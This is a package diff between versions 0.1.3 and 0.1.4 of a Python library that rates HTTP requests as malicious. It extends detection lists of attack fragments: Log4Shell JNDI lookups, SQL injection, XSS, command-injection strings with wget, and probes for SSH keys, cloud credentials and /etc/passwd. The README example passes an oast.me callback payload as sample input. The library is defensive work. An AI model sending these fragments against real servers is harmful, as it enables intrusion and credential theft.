# Comparing `tmp/httpanalyzer-0.1.3.tar.gz` & `tmp/httpanalyzer-0.1.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "httpanalyzer-0.1.3.tar", last modified: Sun Feb 26 11:33:48 2023, max compression
+gzip compressed data, was "httpanalyzer-0.1.4.tar", last modified: Tue Apr 11 15:32:25 2023, max compression
```

## Comparing `httpanalyzer-0.1.3.tar` & `httpanalyzer-0.1.4.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2023-02-26 11:33:48.054461 httpanalyzer-0.1.3/
--rw-rw-rw-   0        0        0     1091 2023-01-16 19:33:15.000000 httpanalyzer-0.1.3/LICENSE.txt
--rw-rw-rw-   0        0        0     3207 2023-02-26 11:33:48.054461 httpanalyzer-0.1.3/PKG-INFO
--rw-rw-rw-   0        0        0     2513 2023-02-20 18:23:56.000000 httpanalyzer-0.1.3/README.md
--rw-rw-rw-   0        0        0      779 2023-02-26 11:33:14.000000 httpanalyzer-0.1.3/pyproject.toml
--rw-rw-rw-   0        0        0       42 2023-02-26 11:33:48.054461 httpanalyzer-0.1.3/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-02-26 11:33:48.017636 httpanalyzer-0.1.3/src/
-drwxrwxrwx   0        0        0        0 2023-02-26 11:33:48.034531 httpanalyzer-0.1.3/src/httpanalyzer/
--rw-rw-rw-   0        0        0     3769 2023-02-16 16:21:07.000000 httpanalyzer-0.1.3/src/httpanalyzer/__init__.py
--rw-rw-rw-   0        0        0     8450 2023-02-26 11:31:38.000000 httpanalyzer-0.1.3/src/httpanalyzer/src.py
--rw-rw-rw-   0        0        0      444 2023-02-09 13:36:28.000000 httpanalyzer-0.1.3/src/httpanalyzer/utils.py
-drwxrwxrwx   0        0        0        0 2023-02-26 11:33:48.054461 httpanalyzer-0.1.3/src/httpanalyzer.egg-info/
--rw-rw-rw-   0        0        0     3207 2023-02-26 11:33:48.000000 httpanalyzer-0.1.3/src/httpanalyzer.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      275 2023-02-26 11:33:48.000000 httpanalyzer-0.1.3/src/httpanalyzer.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-02-26 11:33:48.000000 httpanalyzer-0.1.3/src/httpanalyzer.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       13 2023-02-26 11:33:48.000000 httpanalyzer-0.1.3/src/httpanalyzer.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-04-11 15:32:25.456770 httpanalyzer-0.1.4/
+-rw-rw-rw-   0        0        0     1091 2023-01-16 19:33:15.000000 httpanalyzer-0.1.4/LICENSE.txt
+-rw-rw-rw-   0        0        0     3249 2023-04-11 15:32:25.456770 httpanalyzer-0.1.4/PKG-INFO
+-rw-rw-rw-   0        0        0     2555 2023-03-16 17:24:20.000000 httpanalyzer-0.1.4/README.md
+-rw-rw-rw-   0        0        0      779 2023-04-11 15:30:31.000000 httpanalyzer-0.1.4/pyproject.toml
+-rw-rw-rw-   0        0        0       42 2023-04-11 15:32:25.458852 httpanalyzer-0.1.4/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-04-11 15:32:25.425169 httpanalyzer-0.1.4/src/
+drwxrwxrwx   0        0        0        0 2023-04-11 15:32:25.439031 httpanalyzer-0.1.4/src/httpanalyzer/
+-rw-rw-rw-   0        0        0     3769 2023-02-16 16:21:07.000000 httpanalyzer-0.1.4/src/httpanalyzer/__init__.py
+-rw-rw-rw-   0        0        0    10517 2023-04-11 15:28:27.000000 httpanalyzer-0.1.4/src/httpanalyzer/src.py
+-rw-rw-rw-   0        0        0      444 2023-02-09 13:36:28.000000 httpanalyzer-0.1.4/src/httpanalyzer/utils.py
+drwxrwxrwx   0        0        0        0 2023-04-11 15:32:25.454748 httpanalyzer-0.1.4/src/httpanalyzer.egg-info/
+-rw-rw-rw-   0        0        0     3249 2023-04-11 15:32:25.000000 httpanalyzer-0.1.4/src/httpanalyzer.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      275 2023-04-11 15:32:25.000000 httpanalyzer-0.1.4/src/httpanalyzer.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-11 15:32:25.000000 httpanalyzer-0.1.4/src/httpanalyzer.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       13 2023-04-11 15:32:25.000000 httpanalyzer-0.1.4/src/httpanalyzer.egg-info/top_level.txt
```

### Comparing `httpanalyzer-0.1.3/LICENSE.txt` & `httpanalyzer-0.1.4/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `httpanalyzer-0.1.3/PKG-INFO` & `httpanalyzer-0.1.4/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: httpanalyzer
-Version: 0.1.3
+Version: 0.1.4
 Summary: Library for analyzing http-requests
 Author-email: Martin Merkli <martin.merkli@protonmail.com>
 License: MIT License
 Project-URL: homepage, https://github.com/MartinMerkli/httpanalyzer
 Project-URL: repository, https://github.com/MartinMerkli/httpanalyzer
 Keywords: python,http
 Classifier: License :: OSI Approved :: MIT License
@@ -70,22 +70,22 @@
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Host': '127.0.0.1:80',
      'User-Agent': 'curl/7.82.0'},
     '159.223.205.51',
     '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
-    ['wp-content', 'wp-config', 'wp-includes']
+    ['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']
 )
 print(f"Malicious rating: {instance.malicious() * 100}%")
 ```
 
 ### Admin Panels
 
-To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes']`.
+To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`.
 
 ### Flask
 
 httpanalyzer natively supports flask request objects:
 
 ```
 instance = httpanalyzer.FlaskRequest(flask.request)
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: httpanalyzer Version: 0.1.3 Summary: Library for
+Metadata-Version: 2.1 Name: httpanalyzer Version: 0.1.4 Summary: Library for
 analyzing http-requests Author-email: Martin Merkli
 merkli@protonmail.com> License: MIT License Project-URL: homepage, https://
 github.com/MartinMerkli/httpanalyzer Project-URL: repository, https://
 github.com/MartinMerkli/httpanalyzer Keywords: python,http Classifier: License
 :: OSI Approved :: MIT License Classifier: Operating System :: OS Independent
 Classifier: Programming Language :: Python :: 3 Classifier: Intended Audience
 :: Developers Classifier: Intended Audience :: System Administrators Requires-
@@ -18,13 +18,14 @@
 admin_panels) ``` Print the malicious rating: ``` print(instance.malicious())
 ``` ### Example ``` import httpanalyzer instance = httpanalyzer.Request(
 {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/
 avif,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-
 Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Host': '127.0.0.1:
 80', 'User-Agent': 'curl/7.82.0'}, '159.223.205.51', '/api/geojson?url=${jndi:
 ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}', ['wp-content', 'wp-
-config', 'wp-includes'] ) print(f"Malicious rating: {instance.malicious() *
-100}%") ``` ### Admin Panels To reduce the amount of false positives, specify
-all admin panels you are using. For WordPress this would be `['wp-content',
-'wp-config', 'wp-includes']`. ### Flask httpanalyzer natively supports flask
-request objects: ``` instance = httpanalyzer.FlaskRequest(flask.request) ``` ##
-Dependencies Python 3.6 or newer is required. Older versions do not work.
+config', 'wp-includes', 'wp-admin', 'admin'] ) print(f"Malicious rating:
+{instance.malicious() * 100}%") ``` ### Admin Panels To reduce the amount of
+false positives, specify all admin panels you are using. For WordPress this
+would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`. ###
+Flask httpanalyzer natively supports flask request objects: ``` instance =
+httpanalyzer.FlaskRequest(flask.request) ``` ## Dependencies Python 3.6 or
+newer is required. Older versions do not work.
```

### Comparing `httpanalyzer-0.1.3/README.md` & `httpanalyzer-0.1.4/README.md`

 * *Files 8% similar despite different names*

```diff
@@ -52,22 +52,22 @@
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Host': '127.0.0.1:80',
      'User-Agent': 'curl/7.82.0'},
     '159.223.205.51',
     '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
-    ['wp-content', 'wp-config', 'wp-includes']
+    ['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']
 )
 print(f"Malicious rating: {instance.malicious() * 100}%")
 ```
 
 ### Admin Panels
 
-To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes']`.
+To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`.
 
 ### Flask
 
 httpanalyzer natively supports flask request objects:
 
 ```
 instance = httpanalyzer.FlaskRequest(flask.request)
```

#### html2text {}

```diff
@@ -9,13 +9,14 @@
 admin_panels) ``` Print the malicious rating: ``` print(instance.malicious())
 ``` ### Example ``` import httpanalyzer instance = httpanalyzer.Request(
 {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/
 avif,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-
 Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Host': '127.0.0.1:
 80', 'User-Agent': 'curl/7.82.0'}, '159.223.205.51', '/api/geojson?url=${jndi:
 ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}', ['wp-content', 'wp-
-config', 'wp-includes'] ) print(f"Malicious rating: {instance.malicious() *
-100}%") ``` ### Admin Panels To reduce the amount of false positives, specify
-all admin panels you are using. For WordPress this would be `['wp-content',
-'wp-config', 'wp-includes']`. ### Flask httpanalyzer natively supports flask
-request objects: ``` instance = httpanalyzer.FlaskRequest(flask.request) ``` ##
-Dependencies Python 3.6 or newer is required. Older versions do not work.
+config', 'wp-includes', 'wp-admin', 'admin'] ) print(f"Malicious rating:
+{instance.malicious() * 100}%") ``` ### Admin Panels To reduce the amount of
+false positives, specify all admin panels you are using. For WordPress this
+would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`. ###
+Flask httpanalyzer natively supports flask request objects: ``` instance =
+httpanalyzer.FlaskRequest(flask.request) ``` ## Dependencies Python 3.6 or
+newer is required. Older versions do not work.
```

### Comparing `httpanalyzer-0.1.3/pyproject.toml` & `httpanalyzer-0.1.4/pyproject.toml`

 * *Files 1% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 [build-system]
 requires = ["setuptools>=61.0"]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "httpanalyzer"
-version = "0.1.3"
+version = "0.1.4"
 authors = [
   { name="Martin Merkli", email="martin.merkli@protonmail.com" },
 ]
 description = "Library for analyzing http-requests"
 readme = "README.md"
 license = { text = "MIT License" }
 requires-python = ">=3.6"
```

### Comparing `httpanalyzer-0.1.3/src/httpanalyzer/__init__.py` & `httpanalyzer-0.1.4/src/httpanalyzer/__init__.py`

 * *Files identical despite different names*

### Comparing `httpanalyzer-0.1.3/src/httpanalyzer/src.py` & `httpanalyzer-0.1.4/src/httpanalyzer/src.py`

 * *Files 22% similar despite different names*

```diff
@@ -10,23 +10,25 @@
     'bingbot',  # search engine
     'bingpreview',  # search engine
     'bit.ly/3ezndno',  # company creating statistics about server software
     'censysinspect',  # company providing cyber-security monitoring
     'cfnetwork',  # client for swift
     'cyberwarcon',  # was trying to access the same uncommon url in regular intervals
     'domains project',  # project creating statistics about domain names
+    'duckduckgo',  # search engine
     'expanse, a palo alto networks company',  # company searching for specific information
     'fasthttp',  # client for go
     'feedfetcher-google',  # search engine
     'fuzz faster u fool',  # automatic web fuzzer and pentesting tool
     'github.com/projectdiscovery/httpx',  # web scraper
     'go-http-client',  # client for go
     'google-read-aloud',  # search engine
     'google-site-verification',  # search engine
     'googlebot',  # search engine
+    'guayoyo',  # was trying to access sketchy urls on websites
     'hello world',  # generic bot user agent
     'hello, momentum',  # generic bot user agent
     'hello, umad?',  # generic bot user agent
     'hello, world',  # generic bot user agent
     'http banner detection',  # research project conducting network security studies
     'https://csirt.divd.nl/',  # automatic vulnerability disclosure
     'https://developers.google.com/',  # search engine
@@ -57,24 +59,26 @@
     'requests',  # client for python
     'scaninfo@paloaltonetworks.com',  # company searching for specific information
     'security.ipip.net',  # research project conducting network security studies
     'semrush',  # crawler
     'storebot-google',  # search engine
     'tchelebi',  # company providing cyber-security monitoring
     'urllib',  # client for python
+    'vcenter',  # was trying to access sketchy urls on websites
     'yandex',  # search engine
     'zgrab',  # pentesting tool
 }
 SEARCH_ENGINE_AGENT = {
     'adidxbot',  # Bing
     'adsbot-google',  # Google
     'apis-google',  # Google
     'baiduspider',  # Baidu
     'bingbot',  # Bing
     'bingpreview',  # Bing
+    'duckduckgo',  # DuckDuckGo
     'feedfetcher-google',  # Google
     'google-read-aloud',  # Google
     'google-site-verification',  # Google
     'googlebot',  # Google
     'mediapartners-google',  # Google
     'microsoftpreview',  # Bing
     'mj12bo',  # Majestic
@@ -83,156 +87,211 @@
     'yandex',  # Yandex
 }
 BOTS_PATH = {
     '/robots.txt',
     '/sitemap.xml',
 }
 MALICIOUS_PATHS = {
+    '${''.class.forname(\'javax',
     '${@die(md5',
     '${jndi:ldap://$',
+    '&_method=__construct&method=*&filter[]=',
     '(*),concat(0x7e,md5(1)',
     '--exec=<divd',
     '.git/config',
     '.git/head',
     '.github/workflows/',
+    '.idea/httprequests',
     '.oast.',
+    '.remote-sync.json',
+    '.svn/entries',
+    '.vscode/sftp.json',
+    '.well-known/security.txt',
+    '.well-known/security.txt',
     '/+cscoe+/',
     '/+cscot+/',
     '/+cscou+/',
     '/../',
     '/.aws/',
     '/.config',
     '/.env.',
     '/.ssh/id',
     '/autodiscover/autodiscover.json?@',
     '/config/',
+    '/console',
     '/solr/',
     '/xiao',
     '/~user/',
     '2ioep23yxgkpwamwajv0rhiznfa',
+    '3c625c27b4da33d3d5c12e8d02104755',
     '9568f36-d428-11d2-a769-00aa001acf42',
     '<script>alert(document.domain)</script>',
     '<svg/onload=alert',
+    '?gid=1&page=2&rlist[]=@`%27`',
     '?xdebug_session_start=phpstorm',
     '@java.lang.runtime@getruntime',
     '@zdi/powershell',
     '\\win.ini',
     '_/;/web-inf',
     '__additional',
     '__clockwork/app',
     '_ignition/execute-solution',
     '_profiler/phpinfo',
     'aaaaaaaaaaaaaaaaaaaaaaaaaqr',
     'acsserver',
     'activerecord::pendingmigrationerror',
     'actuator',
+    'adjuncts/3a890183',
     'admin',
+    'ajax_url_encode.php?link_url=',
     'ajaxserversettingschk',
     'ansible.cfg',
+    'api/tools/protocol/checkupdate',
     'app_dev.php/_profiler',
     'appstate&dumpconfig=',
     'appveyor.yml',
+    'atmail/webmail/?format=',
     'audit/gui_detail_view.php',
     'bin/sqlnet.log',
     'binname.arm',
     'boaform',
     'call_user_func_array&vars[0]',
     'casa/nodes/thumbprints',
+    'casa/nodes/thumbprints',
     'cfide',
     'cgi-bin',
+    'checkscriptcompile?value=@grabconfig',
+    'chkisg.htm?sip=1.1.1.1 | cat',
     'chmod+777',
     'class.cs_phpmailer',
     'clientlogin/?srid=&action=showdeny&url=',
     'cmd=nslookup',
     'cmdb/sslvpn_websession',
+    'com.vmware.vsan.client',
     'commpilot',
     'compliancepolicyelements',
+    'conn.php.bak',
+    'controller?mode=8700&operation=1&datagrid=179',
     'core-cloud-config.yml',
     'core-r7rules',
     'cplugerror',
     'createpage-entervariables.action',
     'crlfinjection',
+    'cubemail/filemanagement.php?action=dl&f=',
     'dashboardlayoutonecol',
     'datagrid=179&json=',
     'debug.seam',
     'docker-cloud.yml',
+    'docker-compose',
     'dockerfile',
     'dockerrun.aws.json',
+    'docs/cplugerror.html',
+    'ecp/Current/exporttool/microsoft',
     'ejbinvokerservlet',
+    'etc/local.xml',
     'etc/passwd',
     'extend/pearcmd',
     'faces-redirect=true',
+    'fhem/filelog_logwrapper?dev=',
     'field=updatexml',
     'file:///etc/hosts',
     'foodbakery_radius',
+    'forums/search/z-->"><',
     'ftpsync.settings',
+    'gcloud/credentials.db',
     'google-api-private-key.json',
+    'gponform/diag_form',
     'hnap1',
     'inicio.jsp',
     'inicio.pl',
     'interact.sh',
     'invokefunction&function=',
+    'irj/go/km/navigation',
     'java.io.inputstreamreader',
     'java.lang.processbuilder',
     'java.lang:type=memory',
     'javascript:alert',
     'jira-webapp-dist',
     'jmxinvokerservlet',
+    'jolokia/read/getdiagnosticoptions',
     'jre-6u13-windows-i586-p',
     'karma.conf.js',
+    'ker_portal/c/version.js',
     'kustomization.yml',
+    'kvmlm2/index.dhtml?fname=&language=',
     'lang_modvalidate.php',
+    'libs/granite/offloading/content/view',
     'libs/granite/ui',
     'linusadmin-phpinfo',
+    'loadframe?frame_name=x&src=x&single_signout=',
     'log_upload_wsgi.py',
+    'magmi/web/ajax_pluginconf.php',
     'mailsms/s?func=a',
     'mapname=poc.conf',
     'mbeanserverdelegate',
     'methodaccessor.denymethodexecution',
     'microsoft.exchange.ediscovery.exporttool.application',
     'microstrategy',
+    'mifs/.;/services',
     'mirai.arm',
     'mozi.a+jaws',
     'mpxnode/www/appconfig',
+    'msmtprc',
     'nginx-status',
     'nmaplowercheck',
     'nomgif=tarik',
     'null,null,null,null',
     'oa_html/jtfwrepo.xml',
     'oauth2login?error=',
     'ognlcontext@default_member_access',
     'onload=confirm',
     'onmouseover=',
     'opensso/sessionservice',
+    'option=com_joomlaupdater&controller=',
     'org.apache.struts2.servletactioncontext',
     'org.apache.tomcat.instancemanager',
+    'org.jenkinsci.plugins.workflow.cps.cpsflowdefinition',
     'owa/auth/logon.aspx',
     'path=x&site[x][text]',
+    'paytm_action=curltest&url=',
     'phpmyadmin',
+    'plugins/advanced-dewplayer',
+    'plus/ajax_officebuilding.php?act=key&key=',
     'pools/default/buckets',
+    'portal/portal.mwsl',
+    'portal0000.htm',
     'portal_inc.lua',
+    'printenv.pl',
     'profileidx=web.item.graph',
+    'putty.ppk',
+    'pvc/v1/increase/1&post_ids=0',
     'querycomponentrenderervalue',
+    'qvisdvr',
     'readycloud_control.cgi',
+    'redis.conf',
     'remote/fgt_lang',
     'reset/ijei.yhammq.cdqp7cnnvq02aq05y8tsbddl-qs',
     'rest/applinks/1.',
     'rm+-rf+*;wget',
     'rm+-rf+/tmp/*;wget',
     'scripts/wpnbr.dll',
+    'secret_token.rb',
+    'seeyon/thirdpartycontroller.do',
     'select(md5',
+    'sess-bin/login_handler.cgi',
     'settings.py',
     'sftp-config.json',
     'sharebox&query=app=common',
     'showlogin.cc',
     'sms5/ajax.sms_emoticon',
     'spring-mvc-showcase/resources',
     'sqlitemanager',
     'src/util/php/eval-stdin',
     'sslvpn_websession',
+    'streaming/clients_live.php',
     'string[]{\'sh\',\'-c\',\'id\'}',
     'sum:sys.cpu.nice',
     'syscommand',
     'syslog.rlog=',
     'system/accountmanage/account',
     'telerik.web.ui.webresource.axd',
     'tmp;+wget+',
@@ -241,15 +300,17 @@
     'union+select+(select+concat',
     'user_secrets.yml',
     'username=root&db=mysql',
     'utl_inaddr.get_host_name',
     'vendor/phpunit',
     'ventrilo_srv.ini',
     'w1sizyisicjjb252zxj0iiwgii1zaxplidf4msatzgvwdgggocbncmf5oi9ldgmvcgfzc3dkiiwgim91dcjdxq',
+    'web_vms/level15',
     'webfig',
+    'wgetrc',
     'widget_tabbedcontainer_tab_panel',
     'wlwmanifest',
     'wp-config',
     'wp-content',
     'wp-includes',
     'wp-login',
     'xmldata?item=cpqkey',
```

### Comparing `httpanalyzer-0.1.3/src/httpanalyzer.egg-info/PKG-INFO` & `httpanalyzer-0.1.4/src/httpanalyzer.egg-info/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: httpanalyzer
-Version: 0.1.3
+Version: 0.1.4
 Summary: Library for analyzing http-requests
 Author-email: Martin Merkli <martin.merkli@protonmail.com>
 License: MIT License
 Project-URL: homepage, https://github.com/MartinMerkli/httpanalyzer
 Project-URL: repository, https://github.com/MartinMerkli/httpanalyzer
 Keywords: python,http
 Classifier: License :: OSI Approved :: MIT License
@@ -70,22 +70,22 @@
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Host': '127.0.0.1:80',
      'User-Agent': 'curl/7.82.0'},
     '159.223.205.51',
     '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
-    ['wp-content', 'wp-config', 'wp-includes']
+    ['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']
 )
 print(f"Malicious rating: {instance.malicious() * 100}%")
 ```
 
 ### Admin Panels
 
-To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes']`.
+To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`.
 
 ### Flask
 
 httpanalyzer natively supports flask request objects:
 
 ```
 instance = httpanalyzer.FlaskRequest(flask.request)
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: httpanalyzer Version: 0.1.3 Summary: Library for
+Metadata-Version: 2.1 Name: httpanalyzer Version: 0.1.4 Summary: Library for
 analyzing http-requests Author-email: Martin Merkli
 merkli@protonmail.com> License: MIT License Project-URL: homepage, https://
 github.com/MartinMerkli/httpanalyzer Project-URL: repository, https://
 github.com/MartinMerkli/httpanalyzer Keywords: python,http Classifier: License
 :: OSI Approved :: MIT License Classifier: Operating System :: OS Independent
 Classifier: Programming Language :: Python :: 3 Classifier: Intended Audience
 :: Developers Classifier: Intended Audience :: System Administrators Requires-
@@ -18,13 +18,14 @@
 admin_panels) ``` Print the malicious rating: ``` print(instance.malicious())
 ``` ### Example ``` import httpanalyzer instance = httpanalyzer.Request(
 {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/
 avif,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-
 Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Host': '127.0.0.1:
 80', 'User-Agent': 'curl/7.82.0'}, '159.223.205.51', '/api/geojson?url=${jndi:
 ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}', ['wp-content', 'wp-
-config', 'wp-includes'] ) print(f"Malicious rating: {instance.malicious() *
-100}%") ``` ### Admin Panels To reduce the amount of false positives, specify
-all admin panels you are using. For WordPress this would be `['wp-content',
-'wp-config', 'wp-includes']`. ### Flask httpanalyzer natively supports flask
-request objects: ``` instance = httpanalyzer.FlaskRequest(flask.request) ``` ##
-Dependencies Python 3.6 or newer is required. Older versions do not work.
+config', 'wp-includes', 'wp-admin', 'admin'] ) print(f"Malicious rating:
+{instance.malicious() * 100}%") ``` ### Admin Panels To reduce the amount of
+false positives, specify all admin panels you are using. For WordPress this
+would be `['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']`. ###
+Flask httpanalyzer natively supports flask request objects: ``` instance =
+httpanalyzer.FlaskRequest(flask.request) ``` ## Dependencies Python 3.6 or
+newer is required. Older versions do not work.
```

